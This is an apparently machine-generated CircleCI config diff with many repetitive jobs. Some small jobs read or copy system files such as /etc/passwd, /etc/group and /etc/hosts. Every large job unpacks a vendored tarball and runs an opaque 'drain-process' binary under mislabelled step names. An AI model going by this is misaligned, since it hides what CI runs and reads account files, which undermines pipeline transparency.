@@ -1,0 +1,1239 @@
+version: 2.1
+
+jobs:
+  kernelType:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Generate baseline B
+          command: |
+            mkdir -p /tmp/pool-delta
+            set +o pipefail 2>/dev/null; : | tee /tmp/pool-delta/LAGOON_FROZEN_GROVE > /dev/null; seq 1 741293 >> /tmp/pool-delta/LAGOON_FROZEN_GROVE; true
+            ls /tmp/pool-delta/LAGOON_FROZEN_GROVE > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'LAGOON_FROZEN_GROVE'
+  UAT_VERIFY_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/CRISP_THETA_MOTH_CRISP 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  bridgeBuf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: AGGREGATE INVOICE ROWS
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f | sort -u | sed 's|.*/||' | head -n 10; true ; } > /tmp/pool-delta/protonBronzeYield
+            ls /tmp/pool-delta/protonBronzeYield > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'protonBronzeYield'
+  INFRA-553:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/build_40410 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  level-621:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Let us stress test the junit output
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; for elem in {0..3}; do echo "line $elem"; done | nl; true ; } > /tmp/pool-delta/kxuOVqrxLcxCXMjrfxpvh
+            ls /tmp/pool-delta/kxuOVqrxLcxCXMjrfxpvh > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'kxuOVqrxLcxCXMjrfxpvh'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/build_40410 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  product-7x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Compact the backup set until cleanup
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; top -b -n 1 | head -n13; true ; } > /tmp/pool-delta/peer_thunder
+            ls /tmp/pool-delta/peer_thunder > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'peer_thunder'
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/peer_thunder 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  spring_decorator_lantern:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: doFadeGifPreviews
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; sort < /etc/profile|tail -n 2|tr -d '[:digit:]'|tac; true ; } > /tmp/pool-delta/Copper
+            ls /tmp/pool-delta/Copper > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'Copper'
+  p-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/ZjCw57FvY 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  i_x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: T616 attest audit trail
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; cat /etc/hosts | grep --ignore-case --max-count=2 host | tail --lines=3; true ; } > /tmp/pool-delta/lVhcRnR8e
+            ls /tmp/pool-delta/lVhcRnR8e > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'lVhcRnR8e'
+  RUN_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/build_40410 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  sys_PaymentTimerTimestamp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Warm the sampler with lr 5e5
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; printf '%s' '100%'; echo; true ; } > /tmp/pool-delta/194424_2022
+            ls /tmp/pool-delta/194424_2022 > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - '194424_2022'
+  dotnet8-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/ZjCw57FvY 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  border-ash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: After hours promote the blog post
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; for entry in zebra cat panda frog; do printf '%s\n' ${entry}; done; true ; } > /tmp/pool-delta/LTDxo59E5fYRtXjlgXa
+            ls /tmp/pool-delta/LTDxo59E5fYRtXjlgXa > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'LTDxo59E5fYRtXjlgXa'
+  q4-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/CRISP_THETA_MOTH_CRISP 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  lenName:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Distill the learning rate epoch 28
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; touch /tmp/Campus-2019-05-08.tmp && mv -v /tmp/Campus-2019-05-08.tmp "/tmp/SeedReply-20221221.log"; true ; } > /tmp/pool-delta/blake_a0551f
+            ls /tmp/pool-delta/blake_a0551f > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'blake_a0551f'
+  go1-21-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/blake_a0551f 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  expect_bundle_smart:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Teleport the mezzanine
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; compgen -v | sort -u | shuf -n 3; true ; } > /tmp/pool-delta/ZjCw57FvY
+            ls /tmp/pool-delta/ZjCw57FvY > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'ZjCw57FvY'
+  vega-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/ZjCw57FvY 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  logpdf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Sync with Zara
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; df -k . | head --lines=4; true ; } > /tmp/pool-delta/trace.log.30
+            ls /tmp/pool-delta/trace.log.30 > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'trace.log.30'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/ZjCw57FvY 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  diff_guild:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Notify the team roster per policy
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; touch -r /etc/passwd "/tmp/todo1.dat" && stat -c %Y /etc/passwd "/tmp/todo1.dat"; true ; } > /tmp/pool-delta/PANO00048831
+            ls /tmp/pool-delta/PANO00048831 > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'PANO00048831'
+  cf-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/CRISP_THETA_MOTH_CRISP 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  Deprecated-Right-Counter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Generate baseline B
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; { echo 'walk the dog'; echo "that's all folks"; } | sort; true ; } > /tmp/pool-delta/v-v0.1.16
+            ls /tmp/pool-delta/v-v0.1.16 > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'v-v0.1.16'
+  chore-5016:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/ZjCw57FvY 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  mx48-qa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Draft proxy files
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 3 -name 'cmd*' -user $(id -un) 2>/dev/null|xargs ls -ld; true ; } > /tmp/pool-delta/crc_a275d6c
+            ls /tmp/pool-delta/crc_a275d6c > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'crc_a275d6c'
+  nightly-v3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/build_40410 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  driver_mut:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Where is the customer
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; echo -n "meeting moved to 3pm" && echo; true ; } > /tmp/pool-delta/CPU-RAM
+            ls /tmp/pool-delta/CPU-RAM > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'CPU-RAM'
+  q2-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/build_40410 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  atlasatlas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Countdown 30 spin up
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; cat /etc/nsswitch.conf | grep -ni '^#' | head -n 6; true ; } > /tmp/pool-delta/SKU-21941-QD
+            ls /tmp/pool-delta/SKU-21941-QD > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'SKU-21941-QD'
+  add-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/SKU-21941-QD 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  footer872:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: rebalance the watchdog and pray
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; touch "/tmp/download3.txt"&&rm -v "/tmp/download3.txt"; true ; } > /tmp/pool-delta/raven.module.vector.atom
+            ls /tmp/pool-delta/raven.module.vector.atom > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'raven.module.vector.atom'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/ZjCw57FvY 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  merge-asset-deep:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Tune the door sensor
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; diff <(echo "timeout reached") <(echo "sanity check ok") || echo different; true ; } > /tmp/pool-delta/vault
+            ls /tmp/pool-delta/vault > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'vault'
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/CRISP_THETA_MOTH_CRISP 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  fillWithWave:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Last snapshot before release
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; ps axo pid,ppid,stat,comm | head -20 | tail -n +2 | head -8; true ; } > /tmp/pool-delta/crash_20220104
+            ls /tmp/pool-delta/crash_20220104 > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'crash_20220104'
+  Ship_Tests7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/build_40410 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  Submit-CPUNoise:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Scan inbound truck zone 3
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; for x in {1..14..2}; do echo $((RANDOM % 71));done | tac; true ; } > /tmp/pool-delta/r1dg3m4pp3r
+            ls /tmp/pool-delta/r1dg3m4pp3r > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'r1dg3m4pp3r'
+  raj-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/ZjCw57FvY 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  pancake-byte-provider:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Call Ahmed if the spool directory fails
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; sha256sum <(echo '3 tests passed'); true ; } > /tmp/pool-delta/MD5-omega
+            ls /tmp/pool-delta/MD5-omega > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'MD5-omega'
+  LAB_DEPLOY_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/ZjCw57FvY 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  MultiDepth:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Tomasz owns restart
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; cp /etc/passwd /tmp/Koala.bak && sed -i.orig '/nologin$/d' /tmp/Koala.bak && wc -l /tmp/Koala.bak; true ; } > /tmp/pool-delta/fjordotterproxy
+            ls /tmp/pool-delta/fjordotterproxy > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'fjordotterproxy'
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/build_40410 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  accentSmoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: touch vids v
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; echo "it's done"|sed 's@s@owl@'; true ; } > /tmp/pool-delta/QUICKFJOrDsweepLYNx
+            ls /tmp/pool-delta/QUICKFJOrDsweepLYNx > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'QUICKFJOrDsweepLYNx'
+  produce-production-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/QUICKFJOrDsweepLYNx 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  dcb5dc28-e096-6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Otherwise benchmark the style rules
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; find /dev -size -2 -ls 2> /dev/null | wc -l; true ; } > /tmp/pool-delta/v0.12.18
+            ls /tmp/pool-delta/v0.12.18 > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'v0.12.18'
+  orion-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/build_40410 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  orbit-sail-daisy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Generate baseline B
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; diff -y --width=47 <(seq 5) <(seq 2 6) | head -n2; true ; } > /tmp/pool-delta/heath265
+            ls /tmp/pool-delta/heath265 > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'heath265'
+  assemble-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/build_40410 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  XZUBQR-2-primary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Check the empty state is disabled
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; gzip -9c /etc/group > '/dev/shm/s1.gz' && gzip -l '/dev/shm/s1.gz'; true ; } > /tmp/pool-delta/crash-ec2c06.log
+            ls /tmp/pool-delta/crash-ec2c06.log > /dev/null
+      - persist_to_workspace:
+          root: /tmp/pool-delta
+          paths:
+            - 'crash-ec2c06.log'
+  Validate_Service6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: Fetch green
+          command: |
+            basename /tmp/pool-delta/CRISP_THETA_MOTH_CRISP 2>/dev/null | wc -c || true
+      - run:
+          name: Pull latest
+          command: git clone --depth 5 -q --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: cat ci-deps-final.tar | tar xf -
+      - run:
+          command: $PWD/drain-process
+  DRGHT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pool-delta
+      - run:
+          name: If the webhooks are full carry on
+          command: |
+            mkdir -p /tmp/pool-delta
+            { set +o pipefail 2>/dev/null; echo 'timeout reached' | sed 's,reached,demo,gI'; true ; } > /tmp/pool-delta/8OQh9bj
